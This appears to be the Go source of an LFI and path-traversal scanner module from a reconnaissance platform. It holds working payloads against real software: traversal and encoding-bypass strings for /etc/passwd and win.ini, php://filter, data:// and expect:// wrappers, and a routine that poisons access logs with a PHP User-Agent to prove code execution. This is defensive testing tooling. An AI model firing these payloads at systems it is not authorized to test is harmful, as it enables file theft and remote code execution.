package scanner

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"mime/quotedprintable"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type LFIScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewLFIScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *LFIScanner {
	return &LFIScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var lfiHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   15 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Traversal + wrapper payloads (Linux + Windows + null-byte + encoded + wrapper).
var lfiPayloads = []string{
	"../../../../../../../../etc/passwd",
	"....//....//....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	// UTF-8 "overlong" encoding of ../ — some legacy path-traversal filters that
	// only check for the literal "../" or "%2e%2e%2f" byte sequences miss this.
	"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
	"../../../../../../../../etc/passwd%00",
	// Path-truncation padding — historically defeated naive `.$ext` suffix
	// appending on some old PHP/Apache combos by overflowing MAXPATHLEN.
	"../../../../../../../../etc/passwd" + strings.Repeat("/.", 2048),
	"/etc/passwd",
	"../../../../../../../../proc/self/environ",
	"....\\....\\....\\....\\windows\\win.ini",
	"..\\..\\..\\..\\..\\..\\windows\\win.ini",
	"C:\\windows\\win.ini",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://filter/convert.base64-encode/resource=../../../../etc/passwd",
	// data:// wrapper — only fires with allow_url_include on AND the app
	// require()/include()s the raw param value as code; the payload is a
	// harmless echo of a unique marker (proof-only, no side effects).
	"data://text/plain;base64," + base64.StdEncoding.EncodeToString([]byte("<?php echo 'rcnLFI_"+lfiMarker+"'; ?>")),
	// expect:// wrapper — same allow_url_include gate; `id` is a read-only,
	// non-destructive command used industry-wide as the standard LFI-to-RCE
	// PoC (proves execution without altering anything on the target).
	"expect://id",
	// Double/percent-encoded traversal — bypasses a filter that decodes the
	// input exactly once before checking for "../": a %25-prefixed second
	// layer survives that single-pass check and is decoded again by the
	// underlying web/app server.
	"..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
	"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
	// Path-segment normalization bypass — some reverse proxies/frameworks strip
	// a literal "../" segment but pass a semicolon-terminated one through
	// unmodified, which the app server then normalizes back to "..".
	"..;/..;/..;/..;/..;/..;/etc/passwd",
	"./../../../../../../../etc/passwd",
	// Alternate read-encoding wrappers — some WAFs specifically block the
	// literal string "base64" appearing in a query value; rot13 and
	// quoted-printable achieve the same "reveal source instead of executing
	// it" read primitive while evading a base64-keyword filter.
	"php://filter/string.rot13/resource=index.php",
	"php://filter/convert.quoted-printable-encode/resource=index.php",
}

// lfiLogPaths are common web-server log locations that, if included through a
// vulnerable file parameter, execute attacker-controlled content planted by
// an earlier ordinary request (log poisoning) — the standard LFI-to-RCE
// technique for when direct wrappers (php://filter, data://, expect://) are
// disabled or blocked. poisonRequestLogs plants the marker these look for.
var lfiLogPaths = []string{
	"/var/log/apache2/access.log",
	"/var/log/apache2/error.log",
	"/var/log/httpd/access_log",
	"/var/log/httpd/error_log",
	"/var/log/nginx/access.log",
	"/var/log/nginx/error.log",
	"../../../../../../../../var/log/apache2/access.log",
	"../../../../../../../../var/log/nginx/access.log",
}

// lfiMarker uniquely tags the data:// PoC payload so its confirmation can
// never collide with unrelated page content.
const lfiMarker = "a1b2c3"

// lfiLogPoisonMarker uniquely tags the log-poisoning PoC (see
// poisonRequestLogs) so its confirmation can never collide with the data://
// marker above or with unrelated page content.
const lfiLogPoisonMarker = "d4e5f6"

// Signatures that confirm file read (very low false-positive).
var (
	reEtcPasswd = regexp.MustCompile(`root:.*:0:0:`)
	reWinIni    = regexp.MustCompile(`(?i)\[(fonts|extensions|mci extensions)\]`)
	reDaemon    = regexp.MustCompile(`(?m)^(daemon|bin|sys|nobody):`)
	// /proc/self/environ entries are NUL-separated (PATH=...\x00HTTP_USER_AGENT=...),
	// not newline-separated — [\s\S]* (not [^\x00]*) must cross that NUL byte.
	reProcEnviron = regexp.MustCompile(`PATH=[\s\S]*HTTP_USER_AGENT=`)
	reExpectID    = regexp.MustCompile(`uid=\d+\([\w-]+\)\s+gid=\d+`)
)

const lfiMaxParams = 150

// Run tests file/path-like parameters with traversal + wrapper payloads and
// confirms via /etc/passwd, win.ini, or base64-PHP signatures. Targeted+bounded.
func (s *LFIScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "lfi", "Starting LFI / path-traversal checks...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "lfi", fmt.Sprintf("Selected %d file/path-prone parameters", len(candidates)))
	if len(candidates) == 0 {
		return nil
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)
	corpusDir := ""
	if s.cfg != nil {
		corpusDir = s.cfg.WordlistsDir
	}
	payloads := LoadCorpus(corpusDir, "lfi", lfiPayloads)
	payloads = append(payloads, lfiLogPaths...)

	// Plant the log-poisoning marker once, target-wide, before any candidate is
	// tested — a single ordinary request whose User-Agent is logged verbatim by
	// any standard access log. Harmless unless a vulnerable parameter later
	// include()s that same log file, which is exactly what the payloads above
	// (and confirmLFI's marker check) test for.
	s.poisonRequestLogs(ctx, candidates[0].URL, auth)

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, c := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()

			// A page may legitimately contain a passwd/win.ini-looking sample in
			// documentation. Require the signature to be absent from an unrelated
			// control value before treating a traversal response as evidence.
			control := newXSSToken("rcnlfibase")
			baseBody, baseStatus, _ := sendInjectedFull(ctx, lfiHTTPClient, ip, control, auth)
			if looksLikeBlockPage(baseStatus, baseBody) {
				return
			}
			for _, pl := range payloads {
				body, status, _ := sendInjectedFull(ctx, lfiHTTPClient, ip, pl, auth)
				if body == "" {
					continue
				}
				if looksLikeBlockPage(status, body) {
					continue
				}
				kind := confirmLFI(pl, body)
				if kind == "" || confirmLFI(pl, baseBody) != "" {
					continue
				}

				// Reproduce the positive and then repeat the negative control. This
				// rejects transient upstream pages and rotating debug/documentation
				// content without weakening any real file-read signature.
				body2, status2, _ := sendInjectedFull(ctx, lfiHTTPClient, ip, pl, auth)
				control2, controlStatus, _ := sendInjectedFull(ctx, lfiHTTPClient, ip, newXSSToken("rcnlfictl"), auth)
				if looksLikeBlockPage(status2, body2) || looksLikeBlockPage(controlStatus, control2) ||
					confirmLFI(pl, body2) != kind || confirmLFI(pl, control2) != "" {
					continue
				}
				ev := fmt.Sprintf("Local file read confirmed twice (%s); signature absent from two control responses [HTTP %d/%d, %s %s]",
					kind, status, status2, strings.ToUpper(ip.Method), insertionLocation(ip))
				s.store(targetID, ip, pl, kind, ev)
				found.Add(1)
				logFn("warn", "lfi", fmt.Sprintf("LFI CONFIRMED (%s): %s param=%s [%s/%s]",
					kind, ip.URL, ip.Param, ip.Method, insertionLocation(ip)))
				s.notify(targetID, ip.URL, ip.Param)
				return
			}
		}(c)
	}
	wg.Wait()

	logFn("info", "lfi", fmt.Sprintf("LFI check done. Found %d.", found.Load()))
	return nil
}

// poisonRequestLogs plants a harmless, uniquely-marked PHP echo in the target's
// own access log via a single ordinary request's User-Agent header (every
// standard web server logs it verbatim). If the target later include()s its
// own log file through a vulnerable parameter, PHP executes the planted
// snippet and the marker appears in the response — proof of LFI-to-RCE via
// log poisoning, without writing, deleting, or altering anything the
// application itself does not already log as a matter of course.
func (s *LFIScanner) poisonRequestLogs(ctx context.Context, rawURL string, auth map[string]string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "<?php echo 'rcnLFI_"+lfiLogPoisonMarker+"'; ?>")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := lfiHTTPClient.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// rot13 is the reversible ROT13 substitution, used to decode the
// php://filter/string.rot13 read-wrapper response for confirmation.
func rot13(s string) string {
	return strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z':
			return 'a' + (r-'a'+13)%26
		case r >= 'A' && r <= 'Z':
			return 'A' + (r-'A'+13)%26
		}
		return r
	}, s)
}

// confirmLFI validates a response actually contains file contents.
func confirmLFI(payload, body string) string {
	// Log poisoning: our own marker executing means the target include()d a
	// log file that itself logged our planted User-Agent as PHP source. Check
	// this before anything else — it is independent of which log-path payload
	// was actually sent (log rotation/aliasing can make a slightly different
	// path than the one poisoned still resolve to the same underlying file).
	if strings.Contains(body, "rcnLFI_"+lfiLogPoisonMarker) {
		return "log poisoning code execution"
	}
	if strings.Contains(payload, "string.rot13") {
		if d := rot13(body); strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
			return "php://filter rot13 source disclosure"
		}
	}
	if strings.Contains(payload, "convert.quoted-printable-encode") {
		if dec, err := io.ReadAll(quotedprintable.NewReader(strings.NewReader(body))); err == nil {
			d := string(dec)
			if strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
				return "php://filter quoted-printable source disclosure"
			}
		}
	}
	if reEtcPasswd.MatchString(body) || reDaemon.MatchString(body) {
		return "/etc/passwd"
	}
	if reWinIni.MatchString(body) {
		return "windows/win.ini"
	}
	if strings.Contains(payload, "proc/self/environ") && reProcEnviron.MatchString(body) {
		return "/proc/self/environ"
	}
	// data:// wrapper — our own unique marker echoed back means the app
	// require()/include()d the raw payload as executable PHP.
	if strings.HasPrefix(payload, "data://") && strings.Contains(body, "rcnLFI_"+lfiMarker) {
		return "data:// wrapper code execution"
	}
	// expect:// wrapper — `id` command output pattern is near-impossible to
	// appear by coincidence in an unrelated page.
	if payload == "expect://id" && reExpectID.MatchString(body) {
		return "expect:// wrapper command execution"
	}
	// php://filter base64 wrapper — decode and check for PHP source markers.
	if strings.Contains(payload, "convert.base64-encode") {
		for _, tok := range regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`).FindAllString(body, -1) {
			if dec, err := base64.StdEncoding.DecodeString(tok); err == nil {
				d := string(dec)
				if strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
					return "php://filter base64 source disclosure"
				}
			}
		}
	}
	return ""
}

func (s *LFIScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
	limit := lfiMaxParams
	if s.cfg != nil {
		limit = s.cfg.URLLimit()
	}
	// A small unfamiliar-name fallback catches custom parameters while the main
	// budget stays focused on file/path names and path-looking example values.
	return loadRoutedInsertionPoints(ctx, s.db, targetID, ClassLFI, limit, 32)
}

func (s *LFIScanner) store(targetID string, ip insertionPoint, payload, subtype, evidence string) {
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: "lfi", Subtype: subtype, Severity: "critical", URL: ip.URL, Method: ip.Method,
		Parameter: ip.Param, Location: insertionLocation(ip), Payload: payload, Evidence: evidence,
		Source: "lfi-native", DetectionMethod: "differential-file-signature-replay", Confidence: 99,
		Verdict: VerifyVerified,
	})
}

func (s *LFIScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "lfi", "url": rawURL, "parameter": param,
		})
	}
}
